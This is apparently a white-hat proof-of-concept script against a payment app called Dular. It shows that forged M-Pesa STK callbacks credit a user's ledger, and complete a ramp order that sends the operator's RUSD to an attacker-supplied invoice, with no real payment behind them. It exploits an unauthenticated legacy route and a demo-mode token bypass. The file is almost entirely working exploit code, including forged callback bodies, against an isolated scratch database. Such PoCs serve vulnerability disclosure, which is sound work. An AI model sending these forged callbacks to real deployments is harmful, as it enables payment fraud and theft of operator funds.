// ckb-whitehat PoC — Dular: F1 forged M-Pesa callback = free RUSD
//
// Two demonstrations, both through the REAL Express app (server/index.js),
// real Postgres, vendors mocked at the global fetch boundary:
//
//   F1-A  LEGACY route /api/mpesa/callback/stk — gated only by the
//         LEGACY_MANAGED_WALLET_ENABLED feature flag: NO token, NO Daraja
//         signature, NO IP allowlist. POST ResultCode:0 for an in-flight
//         deposit -> applyStkResult -> settlePaidDeposit -> ledger credit.
//
//   F1-B  RAMP route /api/ramp/callback/stk in DEMO_MODE without a callback
//         token — the demo-mode bypass in callbackTokenMatches()
//         (rampRoutes.js: `if (config.demoMode && !config.ramp.callbackToken)
//         return true`). A forged callback advances a deposit to 'completed'
//         and settles the user's browser invoice: the operator's RUSD moves
//         to the attacker's wallet with no M-Pesa money behind it.
//
// The checkout_request_id is the only lookup key: Daraja's ids are
// time/phone-shaped (ws_CO_...), and the app logs them and stores them in
// provider_payload — realistic leak/guess surface.
//
// Assertions: ledger/order state after the forged POST + a vendor-call
// counter proving zero Daraja/Safaricom calls were made.
//
// The app runs against an ISOLATED scratch database seeded from the target's
// own schema.sql and dropped on teardown.
//
// Run: node f1-forged-callback.mjs
// Env:  DULAR_DIR=<repo root>   (or a server/ dir — both accepted)

import { resolveTarget, targetImport, ensureScratchDb, dropScratchDb, line } from './target.mjs'

const { repoRoot, serverDir } = resolveTarget()
const db = await ensureScratchDb(repoRoot, { name: 'dular_poc_f1' })

process.env.DATABASE_URL = db.url
process.env.LEGACY_MANAGED_WALLET_ENABLED = 'true'   // F1-A surface (one env var)
process.env.DEMO_MODE = 'true'                       // F1-B surface + bypass
process.env.MPESA_ENVIRONMENT = 'production'         // shows demo fabricates even against prod config
delete process.env.RAMP_CALLBACK_TOKEN                // bypass condition

const vendorCalls = []
const fiberCalls = []
const realFetch = globalThis.fetch
// Intercept ONLY the app's outbound calls: Fiber RPC ports (8227/8247) and
// vendor domains. Everything else (the PoC's own requests to the local
// Express server on a random port) passes through untouched.
const fiberCall = (url) => /127\.0\.0\.1:82(27|47)(:|\/|$)/.test(String(url))
const vendorCall = (url) => /safaricom|er-api|africastalking/.test(String(url))
globalThis.fetch = async (url, opts) => {
  const u = String(url)
  if (vendorCall(u)) {
    vendorCalls.push(u)
    throw new Error(`F1: unexpected vendor call to ${u} — the PoC claims zero vendor calls; investigate`)
  }
  if (fiberCall(u)) {
    fiberCalls.push(opts ? String(opts.body || '').slice(0, 80) : '')
    const body = opts?.body ? JSON.parse(opts.body) : {}
    const method = body?.method
    const PARAM = (body.params && body.params[0]) || {}
    const RESULT = {
      get_payment: { payment_hash: PARAM.payment_hash, status: 'Success', fee: '0x0' },
      list_payments: {
        payments: [
          { payment_hash: '0x' + 'ab'.repeat(32), status: 'Success', fee: '0x0' },
          { payment_hash: '0x' + 'cd'.repeat(32), status: 'Success', fee: '0x0' },
          { payment_hash: '0x' + 'ff'.repeat(32), status: 'Success', fee: '0x0' },
        ],
      },
      send_payment: { payment_hash: '0x' + 'cd'.repeat(32), status: 'Success', fee: '0x0' },
      get_invoice: { status: 'Paid', payment_hash: PARAM.payment_hash },
      node_info: { pubkey: '0x' + 'ee'.repeat(33) },
    }
    return new Response(JSON.stringify({ jsonrpc: '2.0', id: 1, result: RESULT[method] ?? null }), {
      status: 200, headers: { 'Content-Type': 'application/json' },
    })
  }
  return realFetch(url, opts)
}

const main = async () => {
  const { default: app } = await targetImport(serverDir, 'index.js')
  const { pool } = await targetImport(serverDir, 'db.js')
  const http = await import('node:http')

  const server = http.createServer(app)
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve))
  const base = `http://127.0.0.1:${server.address().port}`
  const post = async (path, body, token) => {
    const res = await fetch(`${base}${path}${token ? `?token=${token}` : ''}`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body),
    })
    return { status: res.status, json: await res.json().catch(() => null) }
  }

  // ---------------------------------------------------------------- F1-A
  line('F1-A — forged legacy STK callback (no auth, no token, zero vendor calls)')
  const userA = 'aaaa1111-aaaa-aaaa-aaaa-aaaaaaaa1111'
  await pool.query('DELETE FROM ledger_entries WHERE user_id = $1', [userA])
  await pool.query('DELETE FROM ledger_accounts WHERE user_id = $1', [userA])
  await pool.query('DELETE FROM mpesa_callbacks WHERE conversation_id LIKE $1', ['ws_%'])
  await pool.query('DELETE FROM ramp_order_events WHERE order_id = $1', ['eeee5555-eeee-eeee-eeee-eeeeeeee5555'])
  await pool.query('DELETE FROM mpesa_transactions WHERE checkout_request_id LIKE $1', ['ws_CO_%'])
  await pool.query('DELETE FROM ramp_orders WHERE id = $1', ['eeee5555-eeee-eeee-eeee-eeeeeeee5555'])
  await pool.query('DELETE FROM ramp_quotes WHERE id = $1', ['dddd4444-dddd-dddd-dddd-dddddddd4444'])
  await pool.query('INSERT INTO users (id, phone, verified_at) VALUES ($1, $2, now()) ON CONFLICT (id) DO NOTHING', [userA, '+254700000004'])
  await pool.query(
    `INSERT INTO mpesa_transactions
       (id, user_id, kind, phone, kes_amount, rusd_base_units, status,
        checkout_request_id, fiber_invoice, provider_payload)
     VALUES ($1, $2, 'deposit', $3, 100, 100000000, 'pending',
             'ws_CO_forge-legacy-1', 'dular-fiber-invoice-mock', $4)`,
    ['bbbb2222-bbbb-bbbb-bbbb-bbbbbbbb2222', userA, '+254700000004',
     JSON.stringify({ fiberInvoicePaymentHash: '0x' + 'ab'.repeat(32) })],
  )

  const balBefore = BigInt((await pool.query('SELECT COALESCE(MAX(balance_base_units),0) AS m FROM ledger_accounts WHERE user_id=$1', [userA])).rows[0].m)
  const r1 = await post('/api/mpesa/callback/stk', {
    CheckoutRequestID: 'ws_CO_forge-legacy-1',
    ResultCode: '0',
    ResultDesc: 'Success',
    MpesaReceiptNumber: 'FORGED12345',
  })
  const balAfter = BigInt((await pool.query('SELECT COALESCE(SUM(amount_base_units),0) AS s FROM ledger_entries WHERE user_id=$1 AND direction=$2', [userA, 'credit'])).rows[0].s)
  const txState = (await pool.query(`SELECT status FROM mpesa_transactions WHERE checkout_request_id=$1`, ['ws_CO_forge-legacy-1'])).rows[0]?.status
  console.log('forged callback POST -> HTTP', r1.status, JSON.stringify(r1.json))
  console.log(`transaction state: pending -> ${txState}`)
  console.log(`ledger credits: ${balBefore.toString()} -> ${balAfter.toString()} (1 RUSD to the user, 100 KES "paid")`)
  const aFired = r1.status === 200 && txState === 'completed' && balAfter > 0n
  console.log(`vendor calls made: ${vendorCalls.filter((v) => v.includes('safaricom')).length}`)
  console.log(aFired ? 'F1-A FIRED: forged callback credited the ledger with zero M-Pesa money and zero vendor calls' : 'F1-A did not fire (route/flag state changed?)')

  // control: same forged callback for an UNKNOWN checkout id -> no credit
  await post('/api/mpesa/callback/stk', { CheckoutRequestID: 'ws_CO_control-missing', ResultCode: '0' })
  const controlCredits = BigInt((await pool.query('SELECT COALESCE(SUM(amount_base_units),0) AS s FROM ledger_entries WHERE user_id=$1 AND direction=$2', [userA, 'credit'])).rows[0].s)
  console.log(`control (unknown checkout id): credits still ${controlCredits.toString()} (no new credit — the key is the id, not ResultCode)`)

  // ---------------------------------------------------------------- F1-B
  line('F1-B — forged RAMP STK callback, demo-mode bypass (no token required)')
  const userB = 'cccc3333-cccc-cccc-cccc-cccccccc3333'
  const quoteB = 'dddd4444-dddd-dddd-dddd-dddddddd4444'
  await pool.query('INSERT INTO users (id, phone, fiber_pubkey, verified_at) VALUES ($1,$2,$3,now()) ON CONFLICT (id) DO NOTHING',
    [userB, '+254700000005', '0x' + 'ab'.repeat(33)])
  await pool.query(`INSERT INTO ramp_quotes (id, user_id, direction, kes_amount, rate_kes_per_rusd_micros,
      gross_rusd_base_units, fee_rusd_base_units, rusd_amount_base_units, fee_bps, rate_source,
      quoted_at, expires_at) VALUES ($1,$2,'deposit',100,50000000,200000000,5000000,195000000,25,'poc',now(),now()+interval '5 minutes')`,
    [quoteB, userB])
  await pool.query(`INSERT INTO ramp_orders (id, user_id, quote_id, kind, phone, status, idempotency_key,
      kes_amount, rate_kes_per_rusd_micros, gross_rusd_base_units, fee_rusd_base_units,
      rusd_amount_base_units, fee_bps, rate_source, quoted_at, quote_expires_at, browser_pubkey,
      browser_invoice, invoice_payment_hash, checkout_request_id)
    VALUES ($1,$2,$3,'deposit',$4,'mpesa_pending','poc-idem-1',100,50000000,200000000,5000000,195000000,25,'poc',
      now(), now()+interval '5 minutes', $5, 'attacker-browser-invoice-mock', $6, 'ws_CO_forge-ramp-1')`,
    ['eeee5555-eeee-eeee-eeee-eeeeeeee5555', userB, quoteB, '+254700000005',
     '0x' + 'ab'.repeat(33), '0x' + 'ff'.repeat(32)])

  const r2 = await post('/api/ramp/callback/stk', {
    CheckoutRequestID: 'ws_CO_forge-ramp-1',
    ResultCode: '0',
    ResultDesc: 'Success',
  })
  const rampState = (await pool.query(`SELECT status, fiber_payment_hash, fiber_status FROM ramp_orders WHERE checkout_request_id=$1`, ['ws_CO_forge-ramp-1'])).rows[0]
  console.log('forged ramp callback (no token) -> HTTP', r2.status, JSON.stringify(r2.json))
  console.log(`order state: mpesa_pending -> ${rampState?.status} (fiber_payment_hash=${rampState?.fiber_payment_hash?.slice(0, 12)}… status=${rampState?.fiber_status})`)
  const bFired = r2.status === 200 && rampState?.status === 'completed'
  console.log(bFired
    ? 'F1-B FIRED: order completed — operator sent RUSD to the attacker-supplied browser_invoice with zero M-Pesa money and zero vendor calls'
    : 'F1-B did not reach completed this run (state: ' + rampState?.status + ')')

  server.close()
  await pool.end()

  console.log('\n=== F1 verdict ===')
  console.log(`F1-A legacy forgery: ${aFired}    F1-B ramp demo-mode forgery: ${bFired}`)
  console.log(`vendor calls made across the whole run: ${vendorCalls.length}`)
  const fired = aFired || bFired
  console.log(fired ? 'FINDING F1 FIRED' : 'FINDING F1 UNPROVEN')
  return fired ? 0 : 1
}

let exitCode = 0
main()
  .then((code) => { exitCode = code })
  .catch((e) => { console.error('F1 PoC error:', e); exitCode = 2 })
  .finally(async () => {
    // Tear the scratch DB down BEFORE exiting so no PoC row survives.
    await dropScratchDb(db)
    process.exit(exitCode)
  })
